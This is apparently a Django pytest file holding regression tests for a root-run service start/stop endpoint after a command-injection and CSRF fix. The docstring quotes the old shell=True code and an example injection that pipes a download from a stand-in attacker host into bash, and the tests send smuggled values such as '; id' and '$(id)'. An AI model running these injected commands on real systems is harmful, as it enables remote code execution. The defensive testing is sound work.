"""Start/stop/restart on Service Monitoring runs as root.

The endpoint used to take a free-form shell string:

    full_command = f'echo {password} | sudo -S {command}'
    subprocess.run(full_command, shell=True, ...)

so `command` of `restart nginx; curl attacker/x | bash` executed the second half
regardless of whether the password was right, and @csrf_exempt let a page the
operator merely visited post to it with their session attached.

The contract now: the caller names a service and an action, the server builds
the argv. These tests pin that no `command` field survives, that the verb list
cannot be widened from the client, and that the password still has to arrive
encrypted.
"""
import pytest
from django.contrib.auth.models import User
from django.test import Client

from ai_config.views import SERVICE_CONTROL_ACTIONS, _service_config_attempts

pytestmark = pytest.mark.django_db

URL = "/api/sudo-command/"


def _operator(strict_csrf=False):
    """A logged-in operator.

    CSRF checks are off by default here so the functional tests actually reach
    the view instead of being stopped by the middleware; the CSRF boundary
    itself is asserted separately with strict_csrf=True.
    """
    user = User.objects.create_user("ctl-operator-%s" % strict_csrf, password="x")
    user.profile.is_active_session = True
    user.profile.save()
    client = Client(enforce_csrf_checks=strict_csrf)
    client.force_login(user)
    return client


def _post(client, **body):
    return client.post(URL, data="__json__", content_type="application/json",
                       **{})


def _send(client, payload):
    import json as _json
    return client.post(URL, data=_json.dumps(payload), content_type="application/json")


# --- the injection is structurally gone ------------------------------------

def test_a_command_field_is_no_longer_accepted():
    """The old contract is refused; only service+action are read."""
    _service_config_attempts.clear()
    response = _send(_operator(), {
        "command": "restart nginx; touch /tmp/pwned",
        "password": "x",
    })
    assert response.status_code == 400
    _service_config_attempts.clear()


def test_injection_attempt_reaches_no_subprocess():
    """Everything needed to run a command is absent, so nothing can be built."""
    _service_config_attempts.clear()
    client = _operator()
    for payload in (
        {"service": "nginx", "action": "restart", "command": "; id"},
        {"service": "nginx; id", "action": "restart", "encrypted_password": "junk"},
        {"service": "$(id)", "action": "restart", "encrypted_password": "junk"},
        {"service": "nginx", "action": "restart; id", "encrypted_password": "junk"},
        {"service": "nginx", "action": "restart", "password": "x"},
    ):
        response = _send(client, payload)
        assert response.status_code in (400, 403, 429), (
            f"{payload} was not refused cleanly (got {response.status_code})"
        )
    _service_config_attempts.clear()


# --- the verb list is decided server side ----------------------------------

@pytest.mark.parametrize("action", ["daemon-reload", "edit", "disable", "enable",
                                     "mask", "kill", "reboot", ""])
def test_only_start_stop_restart_are_allowed(action):
    _service_config_attempts.clear()
    response = _send(_operator(), {"service": "nginx", "action": action,
                                  "encrypted_password": "junk"})
    assert response.status_code == 400, f"action {action!r} was not refused"
    _service_config_attempts.clear()


def test_the_allowlist_is_exactly_three_verbs():
    assert SERVICE_CONTROL_ACTIONS == {"start", "stop", "restart"}


# --- auth and csrf ---------------------------------------------------------

def test_anonymous_is_refused():
    _service_config_attempts.clear()
    response = _send(Client(), {"service": "nginx", "action": "restart",
                                "encrypted_password": "junk"})
    assert response.status_code in (302, 401, 403)


def test_the_view_is_not_csrf_exempt():
    """Structural check: if csrf_exempt ever comes back, this fails."""
    import inspect
    from ai_config.views import sudo_command
    assert getattr(sudo_command, "csrf_exempt", False) is False


def test_cross_site_post_without_a_token_is_refused():
    """With CSRF enforced, a page the operator visits cannot drive this."""
    _service_config_attempts.clear()
    response = _send(_operator(strict_csrf=True),
                     {"service": "nginx", "action": "restart",
                      "encrypted_password": "junk"})
    # 403 = CSRF middleware rejected it before the view ran.
    assert response.status_code == 403
    _service_config_attempts.clear()


# --- plaintext password ----------------------------------------------------

def test_plaintext_password_field_is_refused():
    _service_config_attempts.clear()
    response = _send(_operator(), {"service": "nginx", "action": "restart",
                                  "password": "hunter2"})
    assert response.status_code == 400
    assert "encrypted" in response.json().get("message", "").lower()
    _service_config_attempts.clear()


def test_rate_limit_applies_to_this_endpoint_too():
    _service_config_attempts.clear()
    client = _operator()
    codes = [_send(client, {"service": "nginx", "action": "restart",
                            "encrypted_password": "junk"}).status_code
             for _ in range(8)]
    assert 429 in codes, f"no throttle engaged: {codes}"
    _service_config_attempts.clear()


# --- method gate -----------------------------------------------------------

def test_get_is_not_allowed():
    response = _operator().get(URL)
    assert response.status_code == 405